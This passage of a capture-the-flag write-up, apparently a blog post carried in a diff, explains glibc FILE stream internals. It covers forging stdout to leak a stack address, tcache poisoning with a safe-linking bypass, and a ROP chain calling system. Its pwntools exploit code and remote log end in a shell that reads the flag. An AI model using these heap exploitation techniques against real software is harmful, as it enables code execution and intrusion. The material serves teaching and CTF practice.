+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_write_base;	<span style="color:#6272a4">/* Start of put area. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_write_ptr;	<span style="color:#6272a4">/* Current put pointer. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_write_end;	<span style="color:#6272a4">/* End of put area. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_buf_base;	<span style="color:#6272a4">/* Start of reserve area. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_buf_end;	<span style="color:#6272a4">/* End of reserve area. */</span>
+
+  <span style="color:#6272a4">/* The following fields are used to support backing up and undo. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_save_base; <span style="color:#6272a4">/* Pointer to start of non-current get area. */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_backup_base;  <span style="color:#6272a4">/* Pointer to first valid character of backup area */</span>
+  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>_IO_save_end; <span style="color:#6272a4">/* Pointer to end of non-current get area. */</span>
+
+  <span style="color:#ff79c6">struct</span> _IO_marker <span style="color:#ff79c6">*</span>_markers;
+
+  <span style="color:#ff79c6">struct</span> _IO_FILE <span style="color:#ff79c6">*</span>_chain;
+
+  <span style="color:#8be9fd">int</span> _fileno;
+  <span style="color:#8be9fd">int</span> _flags2;
+  __off_t _old_offset; <span style="color:#6272a4">/* This used to be _offset but it&#39;s too small.  */</span>
+
+  <span style="color:#6272a4">/* 1+column number of pbase(); 0 is unknown. */</span>
+  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">short</span> _cur_column;
+  <span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">char</span> _vtable_offset;
+  <span style="color:#8be9fd">char</span> _shortbuf[<span style="color:#bd93f9">1</span>];
+
+  _IO_lock_t <span style="color:#ff79c6">*</span>_lock;
+<span style="color:#ff79c6">#ifdef _IO_USE_OLD_IO_FILE
+</span><span style="color:#ff79c6"></span>};
+
+<span style="color:#ff79c6">struct</span> _IO_FILE_complete
+{
+  <span style="color:#ff79c6">struct</span> _IO_FILE _file;
+<span style="color:#ff79c6">#endif
+</span><span style="color:#ff79c6"></span>  __off64_t _offset;
+  <span style="color:#6272a4">/* Wide character stream stuff.  */</span>
+  <span style="color:#ff79c6">struct</span> _IO_codecvt <span style="color:#ff79c6">*</span>_codecvt;
+  <span style="color:#ff79c6">struct</span> _IO_wide_data <span style="color:#ff79c6">*</span>_wide_data;
+  <span style="color:#ff79c6">struct</span> _IO_FILE <span style="color:#ff79c6">*</span>_freeres_list;
+  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>_freeres_buf;
+  size_t __pad5;
+  <span style="color:#8be9fd">int</span> _mode;
+  <span style="color:#6272a4">/* Make sure we don&#39;t get into trouble again.  */</span>
+  <span style="color:#8be9fd">char</span> _unused2[<span style="color:#bd93f9">15</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span> (<span style="color:#8be9fd">int</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>) <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span> (size_t)];
+};
+</code></pre></div><p>Here are brievly role of each fields:</p>
+<ul>
+<li><code>_flags</code> stands for the behaviour of the stream when a file operation occurs.</li>
+<li><code>_IO_read_ptr</code> address of input within the input buffer that has been already used.</li>
+<li><code>_IO_read_end</code> end address of the input buffer.</li>
+<li><code>_IO_read_base</code> base address of the input buffer.</li>
+<li><code>_IO_write_base</code> base address of the ouput buffer.</li>
+<li><code>_IO_write_ptr</code> points to the character that hasn&rsquo;t been printed yet.</li>
+<li><code>_IO_write_end</code> end address of the output buffer.</li>
+<li><code>_IO_buf_base</code> base address for both input and output buffer.</li>
+<li><code>_IO_buf_end</code> end address for both input and output buffer.</li>
+<li><code>_chain</code> stands for the single linked list that links of all file streams.</li>
+<li><code>_fileno</code> stands for the file descriptor associated to the file.</li>
+<li><code>_vtable_offset</code> stands for the offset of the vtable we have to use.</li>
+<li><code>_offset</code> stands for the current offset within the file.</li>
+</ul>
+<p>Relatable flags:</p>
+<ul>
+<li><code>_IO_USER_BUF</code> During line buffered output, _IO_write_base==base() &amp;&amp; epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a &lsquo;\n&rsquo;, then C is inserted, and pptr() incremented.</li>
+<li><code>_IO_MAGIC</code> Magic number of <code>fp-&gt;_flags</code>.</li>
+<li><code>_IO_UNBUFFERED</code> If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</li>
+<li><code>_IO_LINKED</code> In the list of all open files.</li>
+</ul>
+<p>To understand I advise you to read this <a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">great article</a> about FILE structures. What we gonna do right now is trying to understand the use of <code>stdout</code> during within the <code>putchar</code> function. And we will try to find a code path that will not write the provided argument (in this case the <code>\n</code> taken by <code>putchar</code>) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
+Let&rsquo;s take a closer look at the <code> __putc_unlocked_body</code> macro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define __putc_unlocked_body(_ch, _fp)					\
+</span><span style="color:#ff79c6">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)	\
+</span><span style="color:#ff79c6">   ? __overflow (_fp, (unsigned char) (_ch))				\
+</span><span style="color:#ff79c6">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))
+</span><span style="color:#ff79c6"></span>
+</code></pre></div><p>It ends up calling <code>__overflow</code> if there is no more space in the output buffer (<code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)</code>). That&rsquo;s basically the code path we need to trigger to call <code>__overflow</code> instead of just write the provided char into the output buffer.
+So first condition:</p>
+<ul>
+<li><code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">__overflow</span> (FILE <span style="color:#ff79c6">*</span>f, <span style="color:#8be9fd">int</span> ch)
+{
+  <span style="color:#6272a4">/* This is a single-byte stream.  */</span>
+  <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_mode <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+    _IO_fwide (f, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
+  <span style="color:#ff79c6">return</span> _IO_OVERFLOW (f, ch);
+}
+</code></pre></div><p>Given the file stream isn&rsquo;t oriented (byte granularity) we directly reach the <code>_IO_OVERFLOW</code> call, now the final goal to get a leak is to reach the <code>_IO_do_write</code> call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
+</span><span style="color:#6272a4"></span>
+<span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_file_overflow</span> (FILE <span style="color:#ff79c6">*</span>f, <span style="color:#8be9fd">int</span> ch)
+{
+  <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_NO_WRITES) <span style="color:#6272a4">/* SET ERROR */</span>
+    {
+      f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      <span style="color:#ff79c6">return</span> EOF;
+    }
+  <span style="color:#6272a4">/* If currently reading or no buffer allocated. */</span>
+  <span style="color:#ff79c6">if</span> ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+    {
+      <span style="color:#6272a4">/* Allocate a buffer if needed. */</span>
+      <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
+	{
+	  _IO_doallocbuf (f);
+	  _IO_setg (f, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+	}
+      <span style="color:#6272a4">/* Otherwise must be currently reading.
+</span><span style="color:#6272a4">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
+</span><span style="color:#6272a4">	 logically slide the buffer forwards one block (by setting the
+</span><span style="color:#6272a4">	 read pointers to all point at the beginning of the block).  This
+</span><span style="color:#6272a4">	 makes room for subsequent output.
+</span><span style="color:#6272a4">	 Otherwise, set the read pointers to _IO_read_end (leaving that
+</span><span style="color:#6272a4">	 alone, so it can continue to correspond to the external position). */</span>
+      <span style="color:#ff79c6">if</span> (__glibc_unlikely (_IO_in_backup (f)))
+	{
+	  size_t nbackup <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">-</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+	  _IO_free_backup_area (f);
+	  f<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">-=</span> MIN (nbackup,
+				   f<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">-</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+	  f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_base;
+	}
+
+      <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">==</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_end)
+	    f<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+      f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr;
+      f<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr;
+      f<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_end;
+      f<span style="color:#ff79c6">-&gt;</span>_IO_read_base <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_ptr <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_read_end;
+
+      f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">|=</span> _IO_CURRENTLY_PUTTING;
+      <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_mode <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">&amp;&amp;</span> f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF <span style="color:#ff79c6">|</span> _IO_UNBUFFERED))
+	f<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr;
+    }
+  <span style="color:#ff79c6">if</span> (ch <span style="color:#ff79c6">==</span> EOF)
+    <span style="color:#ff79c6">return</span> _IO_do_write (f, f<span style="color:#ff79c6">-&gt;</span>_IO_write_base,
+			 f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">-</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_base);
+  <span style="color:#ff79c6">if</span> (f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">==</span> f<span style="color:#ff79c6">-&gt;</span>_IO_buf_end ) <span style="color:#6272a4">/* Buffer is really full */</span>
+    <span style="color:#ff79c6">if</span> (_IO_do_flush (f) <span style="color:#ff79c6">==</span> EOF)
+      <span style="color:#ff79c6">return</span> EOF;
+  <span style="color:#ff79c6">*</span>f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> ch;
+  <span style="color:#ff79c6">if</span> ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_UNBUFFERED)
+      <span style="color:#ff79c6">||</span> ((f<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_LINE_BUF) <span style="color:#ff79c6">&amp;&amp;</span> ch <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;\n&#39;</span>))
+    <span style="color:#ff79c6">if</span> (_IO_do_write (f, f<span style="color:#ff79c6">-&gt;</span>_IO_write_base,
+		      f<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">-</span> f<span style="color:#ff79c6">-&gt;</span>_IO_write_base) <span style="color:#ff79c6">==</span> EOF)
+      <span style="color:#ff79c6">return</span> EOF;
+  <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span>) ch;
+}
+libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
+
+</code></pre></div><p>Given <code>ch</code> is <code>\n</code>, to trigger the <code>_IO_do_flush</code> call which will flush the file stream we have to:</p>
+<ul>
+<li>Remove <code>_IO_NO_WRITES</code> from <code>fp-&gt;_flags</code> to avoid the first condition.</li>
+<li>Add <code>_IO_CURRENTLY_PUTTING</code> to <code>fp-&gt;_flags</code> and give a non <code>NULL</code> value to <code>f-&gt;_IO_write_base</code> to avoid the second condition (useless code).</li>
+<li>make <code>f-&gt;_IO_write_ptr</code> equal to <code>f-&gt;_IO_buf_end</code> to then call <code>_IO_do_flush</code>.</li>
+</ul>
+<p>Now we reached <code>_IO_do_flush</code> which is basically just a macro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define _IO_do_flush(_f) \
+</span><span style="color:#ff79c6">  ((_f)-&gt;_mode &lt;= 0							      \
+</span><span style="color:#ff79c6">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \
+</span><span style="color:#ff79c6">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \
+</span><span style="color:#ff79c6">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \
+</span><span style="color:#ff79c6">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \
+</span><span style="color:#ff79c6">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
+</span><span style="color:#ff79c6"></span>
+</code></pre></div><p>Given <code>stdout</code> is byte-oriented <code>_IO_new_do_write</code> is called:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#6272a4">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">static</span> size_t <span style="color:#50fa7b">new_do_write</span> (FILE <span style="color:#ff79c6">*</span>, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>, size_t);
+
+<span style="color:#6272a4">/* Write TO_DO bytes from DATA to FP.
+</span><span style="color:#6272a4">   Then mark FP as having empty buffers. */</span>
+
+<span style="color:#8be9fd">int</span>
+<span style="color:#50fa7b">_IO_new_do_write</span> (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, size_t to_do)
+{
+  <span style="color:#ff79c6">return</span> (to_do <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>
+	  <span style="color:#ff79c6">||</span> (size_t) new_do_write (fp, data, to_do) <span style="color:#ff79c6">==</span> to_do) <span style="color:#ff79c6">?</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">:</span> EOF;
+}
+libc_hidden_ver (_IO_new_do_write, _IO_do_write)
+
+<span style="color:#ff79c6">static</span> size_t
+new_do_write (FILE <span style="color:#ff79c6">*</span>fp, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data, size_t to_do)
+{
+  size_t count;
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> _IO_IS_APPENDING)
+    <span style="color:#6272a4">/* On a system without a proper O_APPEND implementation,
+</span><span style="color:#6272a4">       you would need to sys_seek(0, SEEK_END) here, but is
+</span><span style="color:#6272a4">       not needed nor desirable for Unix- or Posix-like systems.
+</span><span style="color:#6272a4">       Instead, just indicate that offset (before and after) is
+</span><span style="color:#6272a4">       unpredictable. */</span>
+    fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> _IO_pos_BAD;
+  <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end <span style="color:#ff79c6">!=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base)
+    {
+      off64_t new_pos
+	<span style="color:#ff79c6">=</span> _IO_SYSSEEK (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">-</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_read_end, <span style="color:#bd93f9">1</span>);
+      <span style="color:#ff79c6">if</span> (new_pos <span style="color:#ff79c6">==</span> _IO_pos_BAD)
+	    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+      fp<span style="color:#ff79c6">-&gt;</span>_offset <span style="color:#ff79c6">=</span> new_pos;
+    }
+  count <span style="color:#ff79c6">=</span> _IO_SYSWRITE (fp, data, to_do);
+  <span style="color:#ff79c6">if</span> (fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">&amp;&amp;</span> count)
+    fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">=</span> _IO_adjust_column (fp<span style="color:#ff79c6">-&gt;</span>_cur_column <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>, data, count) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
+  _IO_setg (fp, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base, fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base);
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_base <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_write_ptr <span style="color:#ff79c6">=</span> fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_base;
+  fp<span style="color:#ff79c6">-&gt;</span>_IO_write_end <span style="color:#ff79c6">=</span> (fp<span style="color:#ff79c6">-&gt;</span>_mode <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span>
+		       <span style="color:#ff79c6">&amp;&amp;</span> (fp<span style="color:#ff79c6">-&gt;</span>_flags <span style="color:#ff79c6">&amp;</span> (_IO_LINE_BUF <span style="color:#ff79c6">|</span> _IO_UNBUFFERED))
+		       <span style="color:#ff79c6">?</span> fp<span style="color:#ff79c6">-&gt;</span><span style="color:#8be9fd;font-style:italic">_IO_buf_base</span> : fp<span style="color:#ff79c6">-&gt;</span>_IO_buf_end);
+  <span style="color:#ff79c6">return</span> count;
+}
+
+</code></pre></div><p>To avoid the <code>_IO_SYSSEEK</code> which could break stdout, we can add <code>_IO_IS_APPENDING</code> to <code>fp-&gt;_flags</code>. Then <code>_IO_SYSWRITE</code> is called and prints <code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base</code> bytes from <code>(_f)-&gt;_IO_write_base</code> to stdout. But that&rsquo;s not finished, right after we got the stack leak <code>new_do_write</code> initializes the output / input buffer to <code>_IO_buf_base</code> except for the output buffer which is initialized to <code>_IO_buf_end</code> (<code>_IO_LINE_BUF</code> not present). Thus we have to make <code>fp-&gt;_IO_buf_base</code> and <code>fp-&gt;_IO_buf_end</code> equal to valid writable pointers.</p>
+<p>Thus we just need to:</p>
+<ul>
+<li><code>fp-&gt;_flags</code> = (<code>fp-&gt;_flags</code> &amp; ~(<code>_IO_NO_WRITES</code>)) | <code>_IO_CURRENTLY_PUTTING</code> | <code>_IO_IS_APPENDING</code>.</li>
+<li><code>f-&gt;_IO_write_ptr</code> = <code>fp-&gt;_IO_write_end</code> = <code>f-&gt;_IO_buf_end</code> = <code>&amp;environ + 8</code>.</li>
+<li><code>fp-&gt;_IO_write_base</code> = <code>&amp;environ</code>.</li>
+</ul>
+<p>Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">
+alloc(<span style="color:#bd93f9">3</span>, 
+    pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xfbad1800</span>) <span style="color:#ff79c6">+</span> <span style="color:#6272a4"># _flags</span>
+    pwn<span style="color:#ff79c6">.</span>p64(environ)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">3</span> <span style="color:#ff79c6">+</span> <span style="color:#6272a4"># _IO_read_*</span>
+    pwn<span style="color:#ff79c6">.</span>p64(environ) <span style="color:#ff79c6">+</span> <span style="color:#6272a4"># _IO_write_base</span>
+    pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">2</span> <span style="color:#ff79c6">+</span> <span style="color:#6272a4"># _IO_write_ptr + _IO_write_end</span>
+    pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> <span style="color:#6272a4"># _IO_buf_base</span>
+    pwn<span style="color:#ff79c6">.</span>p64(environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># _IO_buf_end</span>
+    , <span style="color:#bd93f9">0x100</span>) 
+
+stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x130</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> 
+<span style="color:#6272a4"># Offset of the saved rip that belongs to frame of the op_malloc function</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+</code></pre></div><h2 id="ropchain">ROPchain</h2>
+<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function that writes the user input into the requested chunk.</p>
+<p>To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&rsquo;s say we wanna write to <code>target</code> and we have <code>prev</code> that overlaps <code>victim</code>:</p>
+<ul>
+<li><code>free(prev)</code> ends up in the tcachebin (0x140), it has already been consolidated, it <em>already</em> overlaps <code>victim</code>.</li>
+<li><code>free(victim)</code> ends up in the tcachebin (0x110).</li>
+<li><code>malloc(0x130)</code> returns <code>prev</code>, thus we can corrupt <code>victim-&gt;next</code> and intialize it to <code>(target ^ ((chunk_location) &gt;&gt; 12)</code> to bypass safe-linking.</li>
+<li><code>malloc(0x100)</code> returns <code>victim</code> and tcachebin (0x110) next free chunk is <code>target</code>.</li>
+<li><code>malloc(0x100)</code> gives a write what where.</li>
+</ul>
+<p>When we got the write what where on the stack we simply have to craft a call ot system since there is no <code>seccomp</code> shit.
+Here is the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">free(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># prev</span>
+free(<span style="color:#bd93f9">2</span>) <span style="color:#6272a4"># victim</span>
+
+alloc(<span style="color:#bd93f9">5</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64((stack <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb20</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))), <span style="color:#bd93f9">0x130</span>)
+<span style="color:#6272a4"># victim-&gt;next = target</span>
+alloc(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>, <span style="color:#bd93f9">0x100</span>)
+
+alloc(<span style="color:#bd93f9">3</span>, pwn<span style="color:#ff79c6">.</span>p64(stack) <span style="color:#ff79c6">+</span> rop<span style="color:#ff79c6">.</span>chain(), <span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># overwrite sRBP for nothing lmao</span>
+<span style="color:#6272a4"># ROPchain on do_malloc&#39;s stackframe</span>
+</code></pre></div><p>And here we are:</p>
+<pre tabindex="0"><code>nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE HOST=mc.ax PORT=31273
+[*] '/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to mc.ax on port 31273: Done
+/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] heap @ 0x559cb0184000
+[*] libc: 0x7efe8a967000
+[*] environ: 0x7efe8ab88200
+[*] stdout: 0x7efe8ab81780
+[*] stack: 0x7ffe06420710
+[*] Switching to interactive mode
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls
+flag.txt
+run
+$ cat flag.txt
+hope{apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e}
+</code></pre><h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">a1ex.online</a></li>
+<li><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">ray-cp</a></li>
+<li><a href="http://blog.leanote.com/post/mut3p1g/file-struct">Mutepig&rsquo;s Blog</a></li>
+</ul>
+<h2 id="appendices">Appendices</h2>
+<p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfmate</span>
+
